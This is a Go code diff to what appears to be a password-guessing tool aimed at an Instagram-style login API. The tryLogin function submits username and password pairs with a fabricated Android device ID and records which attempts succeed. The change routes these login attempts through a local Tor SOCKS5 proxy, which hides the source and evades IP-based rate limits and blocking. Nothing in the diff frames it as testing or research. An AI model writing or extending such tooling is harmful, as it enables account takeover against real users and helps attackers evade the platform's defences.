@@ -13,6 +13,8 @@ import (
 	"strings"
 	"sync"
 	"time"
+
+	"golang.org/x/net/proxy"
 )
 
 const (
@@ -172,12 +174,25 @@ func waitGroupTimeout(wg *sync.WaitGroup, timeout time.Duration) <-chan struct{}
 	return done
 }
 
+// This function now uses Tor SOCKS5 proxy for HTTP requests.
 func tryLogin(username, password string) LoginResult {
 	loginUrl := API_URL + "accounts/login/"
 	data := url.Values{}
 	data.Set("username", username)
 	data.Set("password", password)
 	data.Set("device_id", fmt.Sprintf("android-%d", time.Now().UnixNano()))
+
+	// Set up Tor SOCKS5 proxy
+	dialer, err := proxy.SOCKS5("tcp", "127.0.0.1:9050", nil, proxy.Direct)
+	if err != nil {
+		log.Printf("Failed to obtain Tor SOCKS5 proxy: %v\n", err)
+		return LoginResult{Username: username, Password: password, Success: false, Time: CURRENT_TIME, Message: "Tor SOCKS5 proxy error"}
+	}
+	transport := &http.Transport{Dial: dialer.Dial}
+	client := &http.Client{
+		Transport: transport,
+		Timeout:   TIMEOUT,
+	}
 
 	req, err := http.NewRequest("POST", loginUrl, strings.NewReader(data.Encode()))
 	if err != nil {
@@ -192,7 +207,6 @@ func tryLogin(username, password string) LoginResult {
 	req.Header.Set("X-IG-Capabilities", "3brTvw==")
 	req.Header.Set("X-IG-Connection-Type", "WIFI")
 
-	client := &http.Client{Timeout: TIMEOUT}
 	resp, err := client.Do(req)
 	if err != nil {
 		log.Printf("Error sending request: %v\n", err)
